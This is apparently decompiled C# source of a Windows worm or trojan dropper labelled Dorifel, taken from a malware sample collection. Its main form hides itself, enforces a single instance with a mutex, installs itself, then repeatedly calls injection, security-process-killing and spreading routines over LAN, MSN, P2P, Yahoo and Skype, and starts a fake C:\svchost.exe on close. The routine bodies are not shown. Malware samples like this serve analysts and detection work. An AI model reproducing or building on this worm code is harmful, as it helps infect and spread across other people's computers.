// Decompiled with JetBrains decompiler
// Type: WoRmy2.Form1
// Assembly: WoRmy2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: BEF434A9-1DC9-4A95-B187-DB247BE58F70
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan-Dropper.Win32.Dorifel.bpw-6712c5b7b64846a6fd241818e9a5ad47266faee1f736c2c3f922e29ca4bcd8e3.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace WoRmy2
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private Mutex objMutex;
    private string yourmutex;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      Form1.__ENCAddToList((object) this);
      this.yourmutex = Environment.UserName + "MutexXx";
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Text = " do";
      this.ResumeLayout(false);
    }

    [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern void Sleep(long dwMilliseconds);

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      this.Hide();
      this.objMutex = new Mutex(false, this.yourmutex);
      if (!this.objMutex.WaitOne(0, false))
      {
        this.objMutex.Close();
        this.objMutex = (Mutex) null;
        ProjectData.EndApp();
      }
      install.inst();
      while (true)
      {
        int num;
        do
        {
          checked { ++num; }
          InjectX.injectX_Sp();
          lan.lan_sp();
          anti.killall();
          msnshare.msnshare_sp();
          p2p.p2p_sp();
          yahoo.yahoo_sp();
          skype.skype_sp();
          Form1.Sleep(1500000L);
        }
        while (num != 3);
        ProjectData.EndApp();
      }
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e) => Process.Start("C:\\svchost.exe");
  }
}
